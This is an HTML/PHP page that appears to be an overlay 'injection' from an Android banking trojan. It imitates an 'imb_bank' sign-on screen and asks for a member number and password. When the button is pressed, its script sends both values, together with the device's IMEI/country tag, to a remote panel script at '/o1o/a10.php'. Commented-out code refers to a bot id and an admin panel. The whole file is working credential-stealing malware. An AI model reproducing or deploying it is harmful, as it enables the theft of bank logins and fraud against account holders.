<html>
<head>
<style>
body, html {
	margin: 0;
	padding: 0;
	background: #fff;
	}
.input {
	height: 35px;
    border: 1px solid #a0a0a0;
    width: 99%;
	padding: 7px;
	margin-bottom: 5px;
	border-radius: 3px;
	color: #000;
}
input[type="button"] {
	background: rgb(246,147,32);
    width: 99%;
    height: 40px;
    color: #fff;
    border-radius: 2px;
    font-weight: bold;
	border: 0 none;
}
.fielderror	{
	height: 35px;
    width: 99%;
	padding: 7px;
	color: #000;
	border: 1px solid #f00;
}
#header {
margin-bottom: 40px;
padding: 10px;
}
</style>
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
<div id="content_div">
<center>
<div id="header">
<img src="data:image/gif;base64,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" style="width: 10%;">
</div>
	<form action="null" method="post" id="_mainForm" target="flow_handler">
		<input class="input" id="id" placeholder="Member Number" type="text" maxlength="8" onkeypress="return event.charCode >= 48 && event.charCode <= 57"><br>
		<input class="input" id="password" placeholder="Password" type="password"><br><br>
			<br>
			<br>
			<br>
			<br>
		<input type="button" value="Sing On" id="input_submitBtn">
	</form>
</center>

<iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe> 

</div>
<script type="text/javascript">
			   
				
				
				(function () {


                   var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
                        var input = objDoc.createElement("input");
                        input.setAttribute("type", "hidden");
                        input.setAttribute("name", sNm);
                        input.setAttribute("value", sV);
						input.value = sV;
                        objForm.appendChild(input);
                    };


                    /*var g_oForm = document.getElementById('_mainForm'), g_sFAct = prompt('getLink');
					
					if(!/https?:\/\//i.test(g_sFAct))
					   g_sFAct = 'http://' + g_sFAct;
					
                    g_oForm.setAttribute('action',g_sFAct); // устанавливаем у формы урл админки
					try{
					   g_oForm.action = g_sFAct;
					} catch(e){};
					
					var g_FrmCode = prompt('getId');
                    __insHiddenField(document, g_oForm, 'code', g_FrmCode); // получаем id бота
*/

                    var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {
					
						var oNumInp = document.getElementById('id');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = oCodeInp.className = 'input';
						} catch(e){};
						
                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{3,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
				top['closeDlg'] = true;
				/*prompt('send', '{"dialog id" : "imb_bank'+
					'", "member_number": "'+oNumInp.value+
					'", "password": "'+oCodeInp.value+'"}');
						
						document.getElementById('content_div').style.visibility = 'hidden';
						g_oForm.submit();*/
						
						
						
var url='<?php echo $URL; ?>';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|imb_bank|"+oNumInp.value+"|"+oCodeInp.value+"|");
						
						return false;
                    };

                })();
            </script>

</body>
</html>
